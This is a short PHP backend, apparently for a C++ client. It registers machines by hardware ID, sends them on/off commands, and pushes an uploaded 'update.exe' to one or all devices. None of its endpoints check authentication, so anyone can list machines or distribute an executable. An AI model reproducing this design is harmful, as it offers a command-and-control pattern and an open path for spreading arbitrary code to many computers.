<?php
header("Content-Type: application/json; charset=UTF-8");
$file = 'devices.json';

if (!file_exists($file)) {
    file_put_contents($file, json_encode([]));
}

$devices = json_decode(file_get_contents($file), true);
if (!is_array($devices)) { $devices = []; }

$action = isset($_GET['action']) ? $_GET['action'] : '';

// 1. C++ PING & GÜNCELLEME KONTROLÜ
if ($action === 'ping') {
    $hwid = isset($_POST['hwid']) ? $_POST['hwid'] : '';
    $pc_name = isset($_POST['pc_name']) ? $_POST['pc_name'] : '';

    if (!empty($hwid)) {
        $found = false;
        foreach ($devices as &$dev) {
            if ($dev['hwid'] === $hwid) {
                $dev['pc_name'] = !empty($pc_name) ? $pc_name : $dev['pc_name'];
                $dev['last_seen'] = time();
                $found = true;
                break;
            }
        }
        if (!$found) {
            $devices[] = [
                'hwid' => $hwid,
                'pc_name' => !empty($pc_name) ? $pc_name : 'Bilinmeyen PC',
                'command' => '1',
                'update' => '0',
                'last_seen' => time()
            ];
        }
        file_put_contents($file, json_encode($devices));
    }

    $current_command = "1";
    $update_status = "0";
    foreach ($devices as $dev) {
        if ($dev['hwid'] === (isset($_POST['hwid']) ? $_POST['hwid'] : '')) {
            $current_command = $dev['command'];
            $update_status = isset($dev['update']) ? $dev['update'] : '0';
            break;
        }
    }

    // Eğer bu cihaza güncelleme atıldıysa ve indirildiyse güncellemeyi sıfırla ki döngüye girmesin
    echo json_encode(["status" => "success", "command" => $current_command, "update" => $update_status]);
    exit;
}

// 2. PANEL İÇİN CİHAZLARI LİSTELE
if ($action === 'get_devices') {
    echo json_encode($devices);
    exit;
}

// 3. KOMUT DEĞİŞTİR (AÇ / KAPAT)
if ($action === 'set_command') {
    $hwid = isset($_POST['hwid']) ? $_POST['hwid'] : '';
    $cmd = isset($_POST['command']) ? $_POST['command'] : '1';

    if ($hwid === 'all') {
        foreach ($devices as &$dev) { $dev['command'] = $cmd; }
    } else {
        foreach ($devices as &$dev) {
            if ($dev['hwid'] === $hwid) { $dev['command'] = $cmd; break; }
        }
    }
    file_put_contents($file, json_encode($devices));
    echo json_encode(["status" => "updated"]);
    exit;
}

// 4. YENİ EXE GÜNCELLEMESİ GÖNDER
if ($action === 'push_update') {
    $hwid = isset($_POST['hwid']) ? $_POST['hwid'] : '';
    
    if (isset($_FILES['update_file'])) {
        $uploadDir = __DIR__ . '/uploads/';
        if (!file_exists($uploadDir)) { mkdir($uploadDir, 0777, true); }
        
        $targetFile = $uploadDir . 'update.exe';
        if (move_uploaded_file($_FILES['update_file']['tmp_name'], $targetFile)) {
            if ($hwid === 'all') {
                foreach ($devices as &$dev) { $dev['update'] = '1'; }
            } else {
                foreach ($devices as &$dev) {
                    if ($dev['hwid'] === $hwid) { $dev['update'] = '1'; break; }
                }
            }
            file_put_contents($file, json_encode($devices));
            echo json_encode(["status" => "success", "message" => "Güncelleme başarıyla dağıtıldı!"]);
            exit;
        }
    }
    echo json_encode(["status" => "error", "message" => "Dosya yüklenemedi!"]);
    exit;
}
?>
